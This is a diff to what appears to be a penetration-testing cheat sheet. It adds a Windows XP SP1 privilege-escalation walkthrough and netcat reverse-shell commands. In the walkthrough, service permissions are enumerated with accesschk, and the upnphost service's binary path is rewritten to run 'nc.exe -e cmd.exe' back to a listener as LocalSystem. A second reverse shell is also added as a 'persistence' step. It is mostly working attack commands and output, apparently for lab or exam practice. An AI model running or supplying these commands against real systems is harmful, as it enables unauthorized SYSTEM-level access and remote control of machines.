@@ -777,6 +777,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 ````
 nc -nlvp 9001
 .\nc.exe <your kali IP> 9001 -e cmd
+C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe
 ````
 #### Powershell
 ````
@@ -959,6 +960,111 @@ nc -nlvp 636 #wait 5 minutes
 ````
 
 ## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
+### Windows Services
+#### Windows XP SP0/SP1 Privilege Escalation
+````
+C:\>systeminfo
+systeminfo
+
+Host Name:                 BOB
+OS Name:                   Microsoft Windows XP Professional
+OS Version:                5.1.2600 Service Pack 1 Build 2600
+````
+````
+https://sohvaxus.github.io/content/winxp-sp1-privesc.html
+unzip Accesschk.zip
+ftp> binary
+200 Type set to I.
+ftp> put accesschk.exe
+local: accesschk.exe remote: accesschk.exe
+````
+##### Download and older version accesschk.exe
+````
+https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip
+````
+##### Enumeration
+````
+accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS
+
+accesschk.exe /accepteula -ucqv upnphost #command
+upnphost
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS
+        
+sc qc upnphost #command
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : Universal Plug and Play Device Host  
+        DEPENDENCIES       : SSDPSRV  
+        SERVICE_START_NAME : NT AUTHORITY\LocalService
+        
+ sc query SSDPSRV #command
+
+SERVICE_NAME: SSDPSRV
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        STATE              : 1  STOPPED 
+                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 1077       (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+sc config SSDPSRV start= auto #command
+[SC] ChangeServiceConfig SUCCESS
+````
+##### Attack setup
+````
+sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe" #command
+[SC] ChangeServiceConfig SUCCESS
+
+sc config upnphost obj= ".\LocalSystem" password= "" #command
+[SC] ChangeServiceConfig SUCCESS
+
+sc qc upnphost #command
+[SC] GetServiceConfig SUCCESS
+
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : Universal Plug and Play Device Host  
+        DEPENDENCIES       : SSDPSRV  
+        SERVICE_START_NAME : LocalSystem
+
+nc -nlvp 443 #on your kali machine
+
+net start upnphost #Last command to get shell
+````
+##### Persistance
+Sometime our shell can die quick, try to connect right away with nc.exe binary to another nc -nlvp listner
+````
+nc -nlvp 80
+
+C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe #command
+(UNKNOWN) [192.168.119.140] 80 (?) open
+````
 ### User Account Control (UAC) Bypass
 UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
 allows an administrator user to bypass UAC by silently elevating our integrity level from medium
